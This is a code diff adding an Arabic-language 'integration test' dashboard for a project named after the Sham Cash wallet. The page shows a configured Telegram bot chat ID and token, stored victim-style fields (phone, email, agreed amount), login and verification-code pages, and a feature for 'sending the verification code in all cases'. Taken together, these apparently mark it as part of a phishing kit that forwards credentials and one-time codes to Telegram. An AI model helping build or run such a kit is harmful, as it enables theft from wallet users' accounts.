@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختبار التكامل - شام كاش</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Cairo', Arial, sans-serif;
+            background: linear-gradient(135deg, #0d1520 0%, #1a2332 100%);
+            color: white;
+            padding: 40px;
+            direction: rtl;
+        }
+        
+        .test-container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+        }
+        
+        h1 {
+            color: #6BADEF;
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .test-section {
+            background: rgba(255, 255, 255, 0.08);
+            padding: 20px;
+            margin-bottom: 20px;
+            border-radius: 12px;
+            border-right: 4px solid #4a7ca8;
+        }
+        
+        .test-section h2 {
+            color: #5AB89E;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        
+        .test-item {
+            padding: 12px;
+            margin: 8px 0;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .status {
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+        
+        .status.success {
+            background: #2ecc71;
+            color: white;
+        }
+        
+        .status.error {
+            background: #e74c3c;
+            color: white;
+        }
+        
+        .status.info {
+            background: #3498db;
+            color: white;
+        }
+        
+        button {
+            padding: 12px 24px;
+            background: linear-gradient(135deg, #4a7ca8, #5a8dc9);
+            border: none;
+            border-radius: 25px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 5px;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(74, 124, 168, 0.5);
+        }
+        
+        .test-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        code {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #6BADEF;
+        }
+    </style>
+</head>
+<body>
+    <div class="test-container">
+        <h1>🧪 اختبار تكامل التطبيق - شام كاش</h1>
+        
+        <div class="test-section">
+            <h2>📱 بوت تيليجرام</h2>
+            <div class="test-item">
+                <span>Chat ID المُعد</span>
+                <code id="chatId">7464148063</code>
+            </div>
+            <div class="test-item">
+                <span>Bot Token</span>
+                <span class="status success">✓ مُعد</span>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h2>💾 Local Storage</h2>
+            <div class="test-item">
+                <span>رقم الهاتف</span>
+                <code id="storedPhone">غير محفوظ</code>
+            </div>
+            <div class="test-item">
+                <span>البريد الإلكتروني</span>
+                <code id="storedEmail">غير محفوظ</code>
+            </div>
+            <div class="test-item">
+                <span>المبلغ المتفق عليه</span>
+                <code id="storedAmount">غير محفوظ</code>
+            </div>
+            <div class="test-buttons">
+                <button onclick="checkLocalStorage()">🔍 فحص البيانات المحفوظة</button>
+                <button onclick="clearLocalStorage()">🗑️ مسح البيانات</button>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h2>📄 الصفحات</h2>
+            <div class="test-item">
+                <span>index.html</span>
+                <span class="status success">✓ جاهز</span>
+            </div>
+            <div class="test-item">
+                <span>login.html</span>
+                <span class="status success">✓ جاهز</span>
+            </div>
+            <div class="test-item">
+                <span>verification.html</span>
+                <span class="status success">✓ جاهز</span>
+            </div>
+            <div class="test-buttons">
+                <button onclick="window.location.href='index.html'">🏠 الصفحة الرئيسية</button>
+                <button onclick="window.location.href='login.html'">🔐 تسجيل الدخول</button>
+                <button onclick="window.location.href='verification.html'">🔢 رمز التحقق</button>
+            </div>
+        </div>
+        
+        <div class="test-section">
+            <h2>🖼️ صورة المشاركة</h2>
+            <div class="test-item">
+                <span>og-image.png</span>
+                <span class="status success">✓ موجود</span>
+            </div>
+            <div class="test-item">
+                <span>الأبعاد</span>
+                <code>1200 × 630</code>
+            </div>
+            <div class="test-item">
+                <span>Meta Tags</span>
+                <span class="status success">✓ محسّنة</span>
+            </div>
+            <img src="og-image.png" alt="صورة المشاركة" style="width: 100%; border-radius: 12px; margin-top: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+        </div>
+        
+        <div class="test-section">
+            <h2>🎯 التحسينات المنفذة</h2>
+            <div class="test-item">
+                <span>✅ حفظ البيانات في localStorage</span>
+                <span class="status success">جديد</span>
+            </div>
+            <div class="test-item">
+                <span>✅ زر إظهار/إخفاء كلمة السر</span>
+                <span class="status success">جديد</span>
+            </div>
+            <div class="test-item">
+                <span>✅ تحسين رؤية المدخلات</span>
+                <span class="status success">جديد</span>
+            </div>
+            <div class="test-item">
+                <span>✅ تأثيرات بصرية محسّنة</span>
+                <span class="status success">جديد</span>
+            </div>
+            <div class="test-item">
+                <span>✅ إرسال رمز التحقق في جميع الحالات</span>
+                <span class="status success">مفعّل</span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        function checkLocalStorage() {
+            document.getElementById('storedPhone').textContent = 
+                localStorage.getItem('userPhone') || 'غير محفوظ';
+            document.getElementById('storedEmail').textContent = 
+                localStorage.getItem('userEmail') || 'غير محفوظ';
+            document.getElementById('storedAmount').textContent = 
+                localStorage.getItem('userAmount') || 'غير محفوظ';
+        }
+        
+        function clearLocalStorage() {
+            localStorage.clear();
+            alert('تم مسح جميع البيانات المحفوظة');
+            checkLocalStorage();
+        }
+        
+        window.addEventListener('load', checkLocalStorage);
+    </script>
+</body>
+</html>
